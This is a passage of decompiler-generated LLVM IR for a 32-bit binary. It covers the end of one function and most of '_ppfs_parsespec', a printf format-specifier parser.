  %v0_804e9b3 = phi i32 [ ptrtoint (i8** @global_var_8056e4a.205 to i32), %entry ], [ %v1_804e9b3, %dec_label_pc_804e9b3 ]
  %v1_804e9b3 = add i32 %v0_804e9b3, -2
  %v1_804e9b6 = inttoptr i32 %v1_804e9b3 to i16*
  %v2_804e9b6 = load i16, i16* %v1_804e9b6, align 2
  %v3_804e9b6 = sext i16 %v2_804e9b6 to i32
  %v12_804e9b9 = icmp ne i32 %v3_804e9b6, %v0_804e9ac
  %v6_804e9c3 = icmp ugt i32 %v1_804e9b3, ptrtoint (i32* @global_var_8056e32.206 to i32)
  %or.cond = and i1 %v6_804e9c3, %v12_804e9b9
  br i1 %or.cond, label %dec_label_pc_804e9b3, label %dec_label_pc_804e9c5

dec_label_pc_804e9c5:                             ; preds = %dec_label_pc_804e9b3
  %.pre = add i32 %v0_804e9b3, -134573620
  %v2_804e9cb = sdiv i32 %.pre, 2
  store i32 %v2_804e9cb, i32* @edx, align 4
  %v1_804e9cd = add i32 %v2_804e9cb, ptrtoint (i8** @global_var_8056e4a.205 to i32)
  %v2_804e9cd = inttoptr i32 %v1_804e9cd to i8*
  %v3_804e9cd = load i8, i8* %v2_804e9cd, align 1
  %v4_804e9cd = zext i8 %v3_804e9cd to i32
  ret i32 %v4_804e9cd

; uselistorder directives
  uselistorder i32 %v2_804e9cb, { 1, 0 }
  uselistorder i32 %v1_804e9b3, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8056e4a.205 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e9d6 = load i32, i32* @edi, align 4
  %v0_804e9d7 = load i32, i32* @esi, align 4
  %v0_804e9d8 = load i32, i32* @ebx, align 4
  store i32 %v0_804e9d8, i32* %stack_var_-16, align 4
  %v4_804e9d8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ea04 = add i32 %tmp76, 24
  %v2_804ea04 = inttoptr i32 %v1_804ea04 to i32*
  %v3_804ea04 = load i32, i32* %v2_804ea04, align 4
  store i32 %v3_804ea04, i32* %eax.global-to-local, align 4
  %v1_804ea0b = add i32 %tmp76, 16
  %v2_804ea0b = inttoptr i32 %v1_804ea0b to i32*
  %v3_804ea0b = load i32, i32* %v2_804ea0b, align 4
  %v1_804ea0e = and i32 %v3_804ea0b, 128
  %v2_804ea0e = icmp eq i32 %v1_804ea0e, 0
  store i32 %v1_804ea0e, i32* %edi.global-to-local, align 4
  %v1_804ea14 = icmp eq i1 %v2_804ea0e, false
  br i1 %v1_804ea14, label %dec_label_pc_804ea27, label %dec_label_pc_804ea16

dec_label_pc_804ea16:                             ; preds = %entry
  %v2_804ea16 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804ea74.outer

dec_label_pc_804ea21:                             ; preds = %dec_label_pc_804ebaf
  %v1_804ea21 = add i32 %v0_804ebaf.pre.pre, 1
  store i32 %v1_804ea21, i32* @esi, align 4
  br label %dec_label_pc_804ebbf

dec_label_pc_804ea27:                             ; preds = %entry
  %v15_804e9d9 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ea29

dec_label_pc_804ea29:                             ; preds = %dec_label_pc_804ea51.dec_label_pc_804ea29_crit_edge, %dec_label_pc_804ea27
  %v2_804ea3a = phi i32 [ %v2_804ea3a.pre, %dec_label_pc_804ea51.dec_label_pc_804ea29_crit_edge ], [ %v15_804e9d9, %dec_label_pc_804ea27 ]
  %v3_804ea3a = phi i32 [ %v1_804ea51, %dec_label_pc_804ea51.dec_label_pc_804ea29_crit_edge ], [ 0, %dec_label_pc_804ea27 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ea2d = mul i32 %v3_804ea3a, 4
  store i32 %v1_804ea2d, i32* @ecx, align 4
  %v2_804ea34 = load i32, i32* %arg1, align 4
  store i32 %v2_804ea34, i32* @edx, align 4
  %v2_804ea36 = add i32 %v1_804ea2d, -4
  %v3_804ea36 = add i32 %v2_804ea36, %v2_804ea34
  %v4_804ea36 = inttoptr i32 %v3_804ea36 to i32*
  %v5_804ea36 = load i32, i32* %v4_804ea36, align 4
  store i32 %v5_804ea36, i32* %eax.global-to-local, align 4
  %v1_804ea3a = trunc i32 %v5_804ea36 to i8
  %v4_804ea3a = add i32 %v2_804ea3a, 36
  %v5_804ea3a = add i32 %v4_804ea3a, %v3_804ea3a
  %v6_804ea3a = inttoptr i32 %v5_804ea3a to i8*
  store i8 %v1_804ea3a, i8* %v6_804ea3a, align 1
  %v0_804ea3e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea3e = urem i32 %v0_804ea3e, 256
  %v2_804ea3e = load i32, i32* @ebx, align 4
  %v3_804ea3e = and i32 %v2_804ea3e, -256
  %v4_804ea3e = or i32 %v3_804ea3e, %v1_804ea3e
  store i32 %v4_804ea3e, i32* @ebx, align 4
  %v1_804ea40 = mul i32 %v0_804ea3e, 16777216
  %v2_804ea40 = sdiv i32 %v1_804ea40, 16777216
  store i32 %v2_804ea40, i32* %eax.global-to-local, align 4
  %v1_804ea43 = load i32, i32* @edx, align 4
  %v2_804ea43 = load i32, i32* @ecx, align 4
  %v3_804ea43 = add i32 %v1_804ea43, -4
  %v4_804ea43 = add i32 %v3_804ea43, %v2_804ea43
  %v5_804ea43 = inttoptr i32 %v4_804ea43 to i32*
  %v6_804ea43 = load i32, i32* %v5_804ea43, align 4
  %v17_804ea43 = icmp eq i32 %v2_804ea40, %v6_804ea43
  %v1_804ea47 = icmp eq i1 %v17_804ea43, false
  br i1 %v1_804ea47, label %dec_label_pc_804ed90, label %dec_label_pc_804ea4d

dec_label_pc_804ea4d:                             ; preds = %dec_label_pc_804ea29
  %v3_804ea4d = trunc i32 %v0_804ea3e to i8
  %v4_804ea4d = icmp eq i8 %v3_804ea4d, 0
  br i1 %v4_804ea4d, label %dec_label_pc_804ea57, label %dec_label_pc_804ea51

dec_label_pc_804ea51:                             ; preds = %dec_label_pc_804ea4d
  %v0_804ea51 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ea51 = add i32 %v0_804ea51, 1
  store i32 %v1_804ea51, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_804ea51, 32
  br i1 %tmp175, label %dec_label_pc_804ea51.dec_label_pc_804ea29_crit_edge, label %dec_label_pc_804ea57

dec_label_pc_804ea51.dec_label_pc_804ea29_crit_edge: ; preds = %dec_label_pc_804ea51
  %v2_804ea3a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ea29

dec_label_pc_804ea57:                             ; preds = %dec_label_pc_804ea51, %dec_label_pc_804ea4d
  %v2_804ea5c = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804ea74.outer

dec_label_pc_804ea74.outer:                       ; preds = %dec_label_pc_804ea57, %dec_label_pc_804ea16, %dec_label_pc_804eb91
  %v0_804ea80.ph94 = phi i32 [ %v1_804eb91, %dec_label_pc_804eb91 ], [ %v2_804ea16, %dec_label_pc_804ea16 ], [ %v2_804ea5c, %dec_label_pc_804ea57 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804eb91 ], [ %tmp66, %dec_label_pc_804ea16 ], [ %tmp66, %dec_label_pc_804ea57 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804ea1a, %dec_label_pc_804eb91 ], [ 0, %dec_label_pc_804ea16 ], [ 0, %dec_label_pc_804ea57 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804eb91 ], [ %v3_804ea04, %dec_label_pc_804ea16 ], [ %v3_804ea04, %dec_label_pc_804ea57 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804eb91 ], [ 0, %dec_label_pc_804ea16 ], [ 0, %dec_label_pc_804ea57 ]
  %v7_804ea7b = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804ea7b = trunc i64 %v7_804ea7b to i32
  %v2_804ea83 = add i32 %v8_804ea7b, 80
  br label %dec_label_pc_804ea74

dec_label_pc_804ea74:                             ; preds = %dec_label_pc_804ea74.outer, %dec_label_pc_804eb31
  %v0_804ea80 = phi i32 [ %v0_804eb3e, %dec_label_pc_804eb31 ], [ %v0_804ea80.ph94, %dec_label_pc_804ea74.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804eb31 ], [ %stack_var_-32.1.ph, %dec_label_pc_804ea74.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804eb31 ], [ %stack_var_-88.1.ph, %dec_label_pc_804ea74.outer ]
  store i32 %v0_804ea80, i32* @edx, align 4
  store i32 %v0_804ea80, i32* @esi, align 4
  %v1_804ea76 = inttoptr i32 %v0_804ea80 to i8*
  %v2_804ea76 = load i8, i8* %v1_804ea76, align 1
  %v11_804ea76 = icmp eq i8 %v2_804ea76, 42
  %v1_804ea79 = icmp eq i1 %v11_804ea76, false
  br i1 %v1_804ea79, label %dec_label_pc_804ea8b, label %dec_label_pc_804ea7b

dec_label_pc_804ea7b:                             ; preds = %dec_label_pc_804ea74
  store i32 %v8_804ea7b, i32* %eax.global-to-local, align 4
  %v1_804ea80 = add i32 %v0_804ea80, 1
  store i32 %v1_804ea80, i32* @esi, align 4
  %v0_804ea83 = load i32, i32* @esp, align 4
  %v3_804ea83 = add i32 %v2_804ea83, %v0_804ea83
  %v4_804ea83 = inttoptr i32 %v3_804ea83 to i32*
  store i32 0, i32* %v4_804ea83, align 4
  %v0_804eaa5.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ea8b

dec_label_pc_804ea8b:                             ; preds = %dec_label_pc_804ea74, %dec_label_pc_804ea7b
  %v0_804eaa5.pre = phi i32 [ %v0_804ea80, %dec_label_pc_804ea74 ], [ %v0_804eaa5.pre.pre, %dec_label_pc_804ea7b ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804ea8d = load i32, i32* @global_var_8059eb8, align 8
  store i32 %v0_804ea8d, i32* %ebp.global-to-local, align 4
  %v4_804eaa5.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804eaa5124 = inttoptr i32 %v0_804eaa5.pre to i8*
  %v2_804eaa5125 = load i8, i8* %v1_804eaa5124, align 1
  %v3_804eaa5126 = zext i8 %v2_804eaa5125 to i32
  %v5_804eaa5127 = and i32 %v4_804eaa5.pre, -256
  %v6_804eaa5128 = or i32 %v3_804eaa5126, %v5_804eaa5127
  store i32 %v6_804eaa5128, i32* %eax.global-to-local, align 4
  %v2_804eaa7129 = sext i8 %v2_804eaa5125 to i32
  store i32 %v2_804eaa7129, i32* @ecx, align 4
  %v2_804eaaa130 = mul nsw i32 %v2_804eaa7129, 2
  %v3_804eaaa131 = add i32 %v2_804eaaa130, %v0_804ea8d
  %v4_804eaaa132 = inttoptr i32 %v3_804eaaa131 to i8*
  %v5_804eaaa133 = load i8, i8* %v4_804eaaa132, align 1
  %v6_804eaaa134 = and i8 %v5_804eaaa133, 8
  %v7_804eaaa135 = icmp eq i8 %v6_804eaaa134, 0
  %v1_804eaaf136 = icmp eq i1 %v7_804eaaa135, false
  br i1 %v1_804eaaf136, label %dec_label_pc_804ea95, label %dec_label_pc_804eab1

dec_label_pc_804ea95:                             ; preds = %dec_label_pc_804ea8b, %dec_label_pc_804eaa4
  %v2_804eaa7140 = phi i32 [ %v2_804eaa7, %dec_label_pc_804eaa4 ], [ %v2_804eaa7129, %dec_label_pc_804ea8b ]
  %v6_804eaa5139 = phi i32 [ %v6_804eaa5, %dec_label_pc_804eaa4 ], [ %v6_804eaa5128, %dec_label_pc_804ea8b ]
  %v0_804eaa4138 = phi i32 [ %v1_804eaa4, %dec_label_pc_804eaa4 ], [ %v0_804eaa5.pre, %dec_label_pc_804ea8b ]
  %v1_804ea9d137 = phi i32 [ %v0_804eabf32, %dec_label_pc_804eaa4 ], [ 0, %dec_label_pc_804ea8b ]
  %v1_804ea95 = add i32 %v1_804ea9d137, -4094
  %v6_804ea95 = sub i32 4093, %v1_804ea9d137
  %v7_804ea95 = and i32 %v6_804ea95, %v1_804ea9d137
  %v8_804ea95 = icmp slt i32 %v7_804ea95, 0
  %v9_804ea95 = icmp eq i32 %v1_804ea95, 0
  %v10_804ea95 = icmp slt i32 %v1_804ea95, 0
  %v3_804ea9b = icmp eq i1 %v10_804ea95, %v8_804ea95
  %v4_804ea9b = icmp eq i1 %v9_804ea95, false
  %v5_804ea9b = and i1 %v4_804ea9b, %v3_804ea9b
  br i1 %v5_804ea9b, label %dec_label_pc_804eaa4, label %dec_label_pc_804ea9d

dec_label_pc_804ea9d:                             ; preds = %dec_label_pc_804ea95
  %v3_804ea9d = mul i32 %v1_804ea9d137, 10
  store i32 %v3_804ea9d, i32* %eax.global-to-local, align 4
  %v2_804eaa0 = add i32 %v3_804ea9d, -48
  %v3_804eaa0 = add i32 %v2_804eaa0, %v2_804eaa7140
  store i32 %v3_804eaa0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804eaa4

dec_label_pc_804eaa4:                             ; preds = %dec_label_pc_804ea95, %dec_label_pc_804ea9d
  %v0_804eabf32 = phi i32 [ %v1_804ea9d137, %dec_label_pc_804ea95 ], [ %v3_804eaa0, %dec_label_pc_804ea9d ]
  %v4_804eaa528 = phi i32 [ %v6_804eaa5139, %dec_label_pc_804ea95 ], [ %v3_804ea9d, %dec_label_pc_804ea9d ]
  %v1_804eaa4 = add i32 %v0_804eaa4138, 1
  store i32 %v1_804eaa4, i32* @esi, align 4
  %v1_804eaa5 = inttoptr i32 %v1_804eaa4 to i8*
  %v2_804eaa5 = load i8, i8* %v1_804eaa5, align 1
  %v3_804eaa5 = zext i8 %v2_804eaa5 to i32
  %v5_804eaa5 = and i32 %v4_804eaa528, -256
  %v6_804eaa5 = or i32 %v3_804eaa5, %v5_804eaa5
  store i32 %v6_804eaa5, i32* %eax.global-to-local, align 4
  %v2_804eaa7 = sext i8 %v2_804eaa5 to i32
  store i32 %v2_804eaa7, i32* @ecx, align 4
  %v2_804eaaa = mul nsw i32 %v2_804eaa7, 2
  %v3_804eaaa = add i32 %v2_804eaaa, %v0_804ea8d
  %v4_804eaaa = inttoptr i32 %v3_804eaaa to i8*
  %v5_804eaaa = load i8, i8* %v4_804eaaa, align 1
  %v6_804eaaa = and i8 %v5_804eaaa, 8
  %v7_804eaaa = icmp eq i8 %v6_804eaaa, 0
  %v1_804eaaf = icmp eq i1 %v7_804eaaa, false
  br i1 %v1_804eaaf, label %dec_label_pc_804ea95, label %dec_label_pc_804eab1

dec_label_pc_804eab1:                             ; preds = %dec_label_pc_804eaa4, %dec_label_pc_804ea8b
  %v1_804ea9d.lcssa = phi i32 [ 0, %dec_label_pc_804ea8b ], [ %v0_804eabf32, %dec_label_pc_804eaa4 ]
  %v0_804eaa4.lcssa = phi i32 [ %v0_804eaa5.pre, %dec_label_pc_804ea8b ], [ %v1_804eaa4, %dec_label_pc_804eaa4 ]
  %v2_804eaa5.lcssa = phi i8 [ %v2_804eaa5125, %dec_label_pc_804ea8b ], [ %v2_804eaa5, %dec_label_pc_804eaa4 ]
  %v6_804eaa5.lcssa = phi i32 [ %v6_804eaa5128, %dec_label_pc_804ea8b ], [ %v6_804eaa5, %dec_label_pc_804eaa4 ]
  %v0_804eab1 = load i32, i32* @edx, align 4
  %v1_804eab1 = add i32 %v0_804eab1, -1
  %v2_804eab1 = inttoptr i32 %v1_804eab1 to i8*
  %v3_804eab1 = load i8, i8* %v2_804eab1, align 1
  %v12_804eab1 = icmp eq i8 %v3_804eab1, 37
  %v1_804eab5 = icmp eq i1 %v12_804eab1, false
  br i1 %v1_804eab5, label %dec_label_pc_804eb48, label %dec_label_pc_804eabb

dec_label_pc_804eabb:                             ; preds = %dec_label_pc_804eab1
  %v10_804eabb = icmp eq i8 %v2_804eaa5.lcssa, 36
  %v1_804eabd = icmp eq i1 %v10_804eabb, false
  br i1 %v1_804eabd, label %dec_label_pc_804eaef, label %dec_label_pc_804eabf

dec_label_pc_804eabf:                             ; preds = %dec_label_pc_804eabb
  %tmp89 = icmp slt i32 %v1_804ea9d.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_804eaef, label %dec_label_pc_804eac3

dec_label_pc_804eac3:                             ; preds = %dec_label_pc_804eabf
  %v1_804eac3 = add i32 %v0_804eaa4.lcssa, 1
  store i32 %v1_804eac3, i32* @edx, align 4
  %v4_804eac6 = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_804eac6, label %dec_label_pc_804ed90, label %dec_label_pc_804ead1

dec_label_pc_804ead1:                             ; preds = %dec_label_pc_804eac3
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804ead9 = sub i32 %v1_804ea9d.lcssa, %stack_var_-88.1
  %v8_804ead9 = xor i32 %v1_804ea9d.lcssa, %stack_var_-88.1
  %v9_804ead9 = xor i32 %v2_804ead9, %v1_804ea9d.lcssa
  %v10_804ead9 = and i32 %v9_804ead9, %v8_804ead9
  %v11_804ead9 = icmp slt i32 %v10_804ead9, 0
  %v12_804ead9 = icmp eq i32 %v2_804ead9, 0
  %v13_804ead9 = icmp slt i32 %v2_804ead9, 0
  %v3_804eadb = icmp ne i1 %v13_804ead9, %v11_804ead9
  %v4_804eadb = or i1 %v12_804ead9, %v3_804eadb
  %stack_var_-88.1.v0_804eadd = select i1 %v4_804eadb, i32 %stack_var_-88.1, i32 %v1_804ea9d.lcssa
  br label %dec_label_pc_804eaeb

dec_label_pc_804eaeb:                             ; preds = %dec_label_pc_804eaff, %dec_label_pc_804ead1, %dec_label_pc_804eb03
  %v0_804eaeb = phi i32 [ %v1_804eac3, %dec_label_pc_804ead1 ], [ %v0_804eab1, %dec_label_pc_804eb03 ], [ %v0_804eab1, %dec_label_pc_804eaff ]
  %stack_var_-32.2 = phi i32 [ %v1_804ea9d.lcssa, %dec_label_pc_804ead1 ], [ %stack_var_-32.1, %dec_label_pc_804eb03 ], [ %stack_var_-32.1, %dec_label_pc_804eaff ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804eadd, %dec_label_pc_804ead1 ], [ 0, %dec_label_pc_804eb03 ], [ 0, %dec_label_pc_804eaff ]
  store i32 %v0_804eaeb, i32* @esi, align 4
  br label %dec_label_pc_804eb12

dec_label_pc_804eaef:                             ; preds = %dec_label_pc_804eabf, %dec_label_pc_804eabb
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804eaff, label %dec_label_pc_804eaf6

dec_label_pc_804eaf6:                             ; preds = %dec_label_pc_804eaef
  %v10_804eaf6 = icmp eq i8 %v2_804eaa5.lcssa, 109
  br i1 %v10_804eaf6, label %dec_label_pc_804eb48, label %dec_label_pc_804ed90

dec_label_pc_804eaff:                             ; preds = %dec_label_pc_804eaef
  %tmp176 = icmp ugt i32 %v0_804eaa4.lcssa, %v0_804eab1
  br i1 %tmp176, label %dec_label_pc_804eb03, label %dec_label_pc_804eaeb

dec_label_pc_804eb03:                             ; preds = %dec_label_pc_804eaff
  %v1_804eb03 = inttoptr i32 %v0_804eab1 to i8*
  %v2_804eb03 = load i8, i8* %v1_804eb03, align 1
  %v8_804eb03 = icmp eq i8 %v2_804eb03, 48
  br i1 %v8_804eb03, label %dec_label_pc_804eaeb, label %dec_label_pc_804eb48

dec_label_pc_804eb12:                             ; preds = %dec_label_pc_804eb23, %dec_label_pc_804eaeb
  %v0_804eb3e = phi i32 [ %v1_804eb23, %dec_label_pc_804eb23 ], [ %v0_804eaeb, %dec_label_pc_804eaeb ]
  %v4_804eb1c35 = phi i32 [ %v6_804eb1c, %dec_label_pc_804eb23 ], [ %v6_804eaa5.lcssa, %dec_label_pc_804eaeb ]
  store i32 ptrtoint ([8 x i8]* @global_var_8056e2a.207 to i32), i32* %edx.global-to-local, align 4
  %v1_804eb1f = inttoptr i32 %v0_804eb3e to i8*
  br label %dec_label_pc_804eb1c

dec_label_pc_804eb1c:                             ; preds = %dec_label_pc_804eb2d, %dec_label_pc_804eb12
  %v4_804eb1c = phi i32 [ %v4_804eb1c35, %dec_label_pc_804eb12 ], [ %v6_804eb1c, %dec_label_pc_804eb2d ]
  %v0_804eb1e = phi i32 [ ptrtoint ([8 x i8]* @global_var_8056e2a.207 to i32), %dec_label_pc_804eb12 ], [ %v1_804eb1e, %dec_label_pc_804eb2d ]
  %v0_804eb2d = phi i32 [ 1, %dec_label_pc_804eb12 ], [ %v2_804eb2d, %dec_label_pc_804eb2d ]
  store i32 %v0_804eb2d, i32* @ecx, align 4
  %v1_804eb1c = inttoptr i32 %v0_804eb1e to i8*
  %v2_804eb1c = load i8, i8* %v1_804eb1c, align 1
  %v3_804eb1c = zext i8 %v2_804eb1c to i32
  %v5_804eb1c = and i32 %v4_804eb1c, -256
  %v6_804eb1c = or i32 %v3_804eb1c, %v5_804eb1c
  store i32 %v6_804eb1c, i32* %eax.global-to-local, align 4
  %v1_804eb1e = add i32 %v0_804eb1e, 1
  store i32 %v1_804eb1e, i32* @edx, align 4
  %v2_804eb1f = load i8, i8* %v1_804eb1f, align 1
  %v15_804eb1f = icmp eq i8 %v2_804eb1f, %v2_804eb1c
  %v1_804eb21 = icmp eq i1 %v15_804eb1f, false
  br i1 %v1_804eb21, label %dec_label_pc_804eb28, label %dec_label_pc_804eb23

dec_label_pc_804eb23:                             ; preds = %dec_label_pc_804eb1c
  %v1_804eb23 = add i32 %v0_804eb3e, 1
  store i32 %v1_804eb23, i32* @esi, align 4
  %v0_804eb24 = load i32, i32* %edi.global-to-local, align 4
  %v2_804eb24 = or i32 %v0_804eb24, %v0_804eb2d
  store i32 %v2_804eb24, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804eb12

dec_label_pc_804eb28:                             ; preds = %dec_label_pc_804eb1c
  %v1_804eb28 = inttoptr i32 %v1_804eb1e to i8*
  %v2_804eb28 = load i8, i8* %v1_804eb28, align 1
  %v3_804eb28 = icmp eq i8 %v2_804eb28, 0
  br i1 %v3_804eb28, label %dec_label_pc_804eb31, label %dec_label_pc_804eb2d

dec_label_pc_804eb2d:                             ; preds = %dec_label_pc_804eb28
  %v2_804eb2d = mul i32 %v0_804eb2d, 2
  br label %dec_label_pc_804eb1c

dec_label_pc_804eb31:                             ; preds = %dec_label_pc_804eb28
  %v0_804eb31 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804eb35 = udiv i32 %v0_804eb31, 2
  %v1_804eb35.not = or i32 %v1_804eb35, -6
  %v1_804eb3a = xor i32 %v1_804eb35.not, 5
  store i32 %v1_804eb3a, i32* %eax.global-to-local, align 4
  %v2_804eb3c = and i32 %v1_804eb3a, %v0_804eb31
  store i32 %v2_804eb3c, i32* %edi.global-to-local, align 4
  %v1_804eb3e = add i32 %v0_804eb3e, -1
  %v2_804eb3e = inttoptr i32 %v1_804eb3e to i8*
  %v3_804eb3e = load i8, i8* %v2_804eb3e, align 1
  %v12_804eb3e = icmp eq i8 %v3_804eb3e, 37
  %v1_804eb42 = icmp eq i1 %v12_804eb3e, false
  br i1 %v1_804eb42, label %dec_label_pc_804ea74, label %dec_label_pc_804eb48

dec_label_pc_804eb48:                             ; preds = %dec_label_pc_804eb03, %dec_label_pc_804eb31, %dec_label_pc_804eab1, %dec_label_pc_804eaf6
  %v0_804eb6b = phi i32 [ %v1_804ea9d.lcssa, %dec_label_pc_804eaf6 ], [ %v1_804ea9d.lcssa, %dec_label_pc_804eb03 ], [ 0, %dec_label_pc_804eb31 ], [ %v1_804ea9d.lcssa, %dec_label_pc_804eab1 ]
  %v1_804eb74 = phi i32 [ %v0_804eaa4.lcssa, %dec_label_pc_804eaf6 ], [ %v0_804eaa4.lcssa, %dec_label_pc_804eb03 ], [ %v0_804eb3e, %dec_label_pc_804eb31 ], [ %v0_804eaa4.lcssa, %dec_label_pc_804eab1 ]
  %v0_804eb71 = phi i32 [ %v0_804eab1, %dec_label_pc_804eaf6 ], [ %v0_804eab1, %dec_label_pc_804eb03 ], [ %v1_804eb1e, %dec_label_pc_804eb31 ], [ %v0_804eab1, %dec_label_pc_804eab1 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804eaf6 ], [ %stack_var_-32.1, %dec_label_pc_804eb03 ], [ %stack_var_-32.2, %dec_label_pc_804eb31 ], [ %stack_var_-32.1, %dec_label_pc_804eab1 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804eaf6 ], [ 0, %dec_label_pc_804eb03 ], [ %stack_var_-88.2, %dec_label_pc_804eb31 ], [ %stack_var_-88.1, %dec_label_pc_804eab1 ]
  %v1_804eb48 = inttoptr i32 %v0_804eb71 to i8*
  %v2_804eb48 = load i8, i8* %v1_804eb48, align 1
  %v11_804eb48 = icmp eq i8 %v2_804eb48, 42
  %v1_804eb4b = icmp eq i1 %v11_804eb48, false
  br i1 %v1_804eb4b, label %dec_label_pc_804eb81, label %dec_label_pc_804eb4d

dec_label_pc_804eb4d:                             ; preds = %dec_label_pc_804eb48
  %v4_804eb4d = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804eb4d, label %dec_label_pc_804eb71, label %dec_label_pc_804eb54

dec_label_pc_804eb54:                             ; preds = %dec_label_pc_804eb4d
  %v1_804eb54 = inttoptr i32 %v1_804eb74 to i8*
  %v2_804eb54 = load i8, i8* %v1_804eb54, align 1
  %v11_804eb54 = icmp eq i8 %v2_804eb54, 36
  %v1_804eb57 = icmp eq i1 %v11_804eb54, false
  br i1 %v1_804eb57, label %dec_label_pc_804ed90, label %dec_label_pc_804eb5d

dec_label_pc_804eb5d:                             ; preds = %dec_label_pc_804eb54
  %tmp91 = icmp slt i32 %v0_804eb6b, 1
  br i1 %tmp91, label %dec_label_pc_804ed90, label %dec_label_pc_804eb65

dec_label_pc_804eb65:                             ; preds = %dec_label_pc_804eb5d
  store i32 %v8_804ea7b, i32* %eax.global-to-local, align 4
  %v1_804eb6a = add i32 %v1_804eb74, 1
  store i32 %v1_804eb6a, i32* @esi, align 4
  %v1_804eb6b = load i32, i32* @esp, align 4
  %v3_804eb6b = add i32 %v8_804ea7b, 68
  %v4_804eb6b = add i32 %v3_804eb6b, %v1_804eb6b
  %v5_804eb6b = inttoptr i32 %v4_804eb6b to i32*
  store i32 %v0_804eb6b, i32* %v5_804eb6b, align 4
  %v0_804ebaf.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804eb7c

dec_label_pc_804eb71:                             ; preds = %dec_label_pc_804eb4d
  %v1_804eb71 = add i32 %v0_804eb71, 1
  store i32 %v1_804eb71, i32* %eax.global-to-local, align 4
  %v12_804eb74 = icmp eq i32 %v1_804eb71, %v1_804eb74
  %v1_804eb76 = icmp eq i1 %v12_804eb74, false
  br i1 %v1_804eb76, label %dec_label_pc_804ed90, label %dec_label_pc_804eb7c

dec_label_pc_804eb7c:                             ; preds = %dec_label_pc_804eb71, %dec_label_pc_804eb65
  %v0_804ebaf.pre.pre.pre = phi i32 [ %v1_804eb74, %dec_label_pc_804eb71 ], [ %v0_804ebaf.pre.pre.pre.pre, %dec_label_pc_804eb65 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804eb81

dec_label_pc_804eb81:                             ; preds = %dec_label_pc_804eb48, %dec_label_pc_804eb7c
  %v0_804ebaf.pre.pre = phi i32 [ %v1_804eb74, %dec_label_pc_804eb48 ], [ %v0_804ebaf.pre.pre.pre, %dec_label_pc_804eb7c ]
  %v0_804ea1a = phi i32 [ %v0_804eb6b, %dec_label_pc_804eb48 ], [ -2147483648, %dec_label_pc_804eb7c ]
  %v4_804eb81 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804eb81 = icmp eq i32 %v4_804eb81, 0
  %v1_804eb86 = icmp eq i1 %v5_804eb81, false
  %.pre = inttoptr i32 %v0_804ebaf.pre.pre to i8*
  br i1 %v1_804eb86, label %dec_label_pc_804ebaa, label %dec_label_pc_804eb8c

dec_label_pc_804eb8c:                             ; preds = %dec_label_pc_804eb81
  %v2_804eb8c = load i8, i8* %.pre, align 1
  %v11_804eb8c = icmp eq i8 %v2_804eb8c, 46
  %v1_804eb8f = icmp eq i1 %v11_804eb8c, false
  br i1 %v1_804eb8f, label %dec_label_pc_804eba3, label %dec_label_pc_804eb91

dec_label_pc_804eb91:                             ; preds = %dec_label_pc_804eb8c
  %v1_804eb91 = add i32 %v0_804ebaf.pre.pre, 1
  store i32 %v1_804eb91, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ea74.outer

dec_label_pc_804eba3:                             ; preds = %dec_label_pc_804eb8c
  br label %dec_label_pc_804ebaa

dec_label_pc_804ebaa:                             ; preds = %dec_label_pc_804eb81, %dec_label_pc_804eba3
  %stack_var_-96.2 = phi i32 [ %v0_804ea1a, %dec_label_pc_804eba3 ], [ %stack_var_-96.1.ph, %dec_label_pc_804eb81 ]
